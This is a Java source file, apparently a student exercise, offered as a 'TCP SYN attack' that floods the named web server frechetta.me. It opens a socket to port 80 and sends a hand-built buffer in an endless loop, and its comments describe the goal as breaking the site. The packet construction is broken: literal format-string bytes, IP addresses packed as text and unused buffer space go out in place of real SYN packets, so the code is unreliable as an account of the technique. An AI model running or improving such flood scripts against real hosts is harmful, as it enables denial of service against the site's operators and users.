/** 
 * <b> TCP Attack </b>
 * @author Edgar Delgado
 * This connects to frechetta.me web server and spams TCP SYN packets.
 */

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.Exception;
import java.net.Socket;
import java.nio.ByteBuffer;

public class TcpSynAttack {
  /**
  * Main Method.
  */
  public static void main(String[] args) {
    boolean timeToExit = false; 



    String characters = "!BBHHHBBH4s4s";

    //converting the string called characters into bytes.
    byte[] charactersBytes = characters.getBytes(); 
    int ipIhl = 5;
    int ipVer = 4;
    final int ipTos = 0;
    final int ipTotLen = 0;
    final int ipId = 54321;
    final int ipFragOff = 0;
    final int ipTtl = 255;
    final int ipProto = 6;
    final int ipCheck = 0;
    String sourceIp = "10.1.12.66"; 
    String destinationIp = "10.1.12.173";
    final byte[] sourceIpBytes = sourceIp.getBytes(); //converting source ip into bytes
    //converting destination ip into bytes
    final byte[] destinationIpBytes = destinationIp.getBytes(); 

    final int ipIhlVer = (ipVer << 4) + ipIhl;

    Socket socket = null; //initialize a socket

    try {
      //creating a socket with the host of "frechetta.me" 
      //which is the website we are trying to hack/break
      //80 is the port number for websites
      socket = new Socket("frechetta.me", 80);  
    } catch (Exception e) {
      System.out.println("Connection FAILED!!! Failed to open connection to a socket.");
      System.exit(0); //if it fails the program ends
    }
    
    System.out.println("Success");

    //We create a byteBuffer object which is going to be use to load everything into bytes
    //but first we allocate enought space for it
    ByteBuffer buf = ByteBuffer.allocate(1024);

    //were push everything into the byteBuffer that is going to get send as a packet
    buf.put(charactersBytes);
    buf.putInt(ipIhlVer);
    buf.putInt(ipTos);
    buf.putInt(ipTotLen);
    buf.putInt(ipId);
    buf.putInt(ipFragOff);
    buf.putInt(ipTtl);
    buf.putInt(ipProto);
    buf.putInt(ipCheck);
    buf.put(sourceIpBytes);
    buf.put(destinationIpBytes);
  
    int size = buf.remaining();
    //we create an array of type byte to transfer everything 
    //from the byteBuffer to the byte array
    byte[] arr = new byte[buf.remaining()];  
    buf.get(arr);//everything in buf(byteBuffer) gets transfer to the array
    System.out.println("Size: " + size);

    long startTime = System.currentTimeMillis();
    System.out.println("startTime: " + startTime);

    int sent = 0;
    //we loop multiple times to send the packet(multiple times) to the website and try to break it.
    while (true) {
      long endTime = System.currentTimeMillis();
      if (endTime - startTime < 60) {
        try (DataOutputStream sendToServer = new DataOutputStream(socket.getOutputStream())) {
          while (timeToExit != true) {
            //we send the packet as an array to the website/server
            sendToServer.write(arr, 0, size);
            sent++;
            System.out.println("Packt got sent");
          }
        } catch (IOException ex) {
          System.out.println("Cannot send packet");
          System.exit(0);
        }
      } else {
        System.exit(0);
      }
    }
  }
}
